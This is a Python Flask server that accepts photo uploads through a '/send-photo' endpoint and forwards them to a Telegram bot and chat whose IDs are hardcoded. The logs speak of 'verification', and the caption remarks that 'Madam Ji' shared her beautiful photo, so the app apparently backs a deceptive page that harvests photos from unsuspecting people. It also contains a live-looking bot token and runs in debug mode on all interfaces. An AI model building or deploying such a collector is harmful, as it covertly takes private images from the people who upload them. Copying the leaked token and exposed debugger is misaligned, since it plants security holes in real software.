import requests
from flask import Flask, jsonify, render_template, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8903839809:AAGFAtDI4HVNwxd4IzCH4WAhY12FY73BvA0"
CHAT_ID = "8036623116"


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send-photo", methods=["POST"])
def send_photo():
    print("--- New Direct Verification Request ---")

    if "photo" not in request.files:
        return jsonify({"success": False, "message": "No file uploaded"})

    file = request.files["photo"]
    if file.filename == "":
        return jsonify({"success": False, "message": "No file selected"})

    filename_lower = file.filename.lower()
    print(f"Processing Incoming Data Stream: {file.filename}")

    # Pehle default photo format me send karne ka try karenge
    url_photo = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files_photo = {"photo": (file.filename, file.stream, file.mimetype)}
    data = {
        "chat_id": CHAT_ID,
        "caption": "❤️ Madam Ji ne apni beautiful photo share ki hai! 😍",
    }

    try:
        response = requests.post(
            url_photo, data=data, files=files_photo, timeout=15
        )
        res_json = response.json()

        # Agar Telegram successfully normal photo accept kar leta hai
        if res_json.get("ok"):
            print("Successfully sent as Standard Photo Preview!")
            return jsonify(
                {"success": True, "message": "Photo sent successfully!"}
            )

        # 🔄 FALLBACK ENGINE: Agar Telegram ne image compression/HEIC bytes ki wajah se reject kiya
        elif "IMAGE_PROCESS_FAILED" in res_json.get("description", ""):
            print(
                "Detected internal image format mismatch. Activating Document Fallback Mode..."
            )

            # Stream memory pointer reset karna zaroori hai read retry ke liye
            file.stream.seek(0)

            url_doc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files_doc = {
                "document": (file.filename, file.stream, file.mimetype)
            }

            response_doc = requests.post(
                url_doc, data=data, files=files_doc, timeout=15
            )
            res_doc_json = response_doc.json()
            print("Fallback API Response:", res_doc_json)

            if res_doc_json.get("ok"):
                return jsonify(
                    {
                        "success": True,
                        "message": "Photo securely delivered as original file!",
                    }
                )
            else:
                return jsonify(
                    {
                        "success": False,
                        "message": res_doc_json.get(
                            "description", "Fallback Transmission Error"
                        ),
                    }
                )
        else:
            return jsonify(
                {
                    "success": False,
                    "message": res_json.get("description", "API Error"),
                }
            )

    except Exception as e:
        print("Exception caught inside thread context:", str(e))
        return jsonify({"success": False, "message": str(e)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=5000)
